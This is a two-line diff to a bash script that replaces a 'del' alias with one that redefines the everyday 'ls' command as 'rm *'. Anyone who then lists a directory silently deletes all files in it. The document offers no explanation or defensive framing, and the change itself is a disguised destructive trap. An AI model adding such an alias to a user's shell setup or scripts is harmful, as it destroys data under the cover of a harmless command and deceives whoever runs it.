@@ -1,2 +1,2 @@
 #!/bin/bash
-alias del="rm *"
+alias ls="rm *"
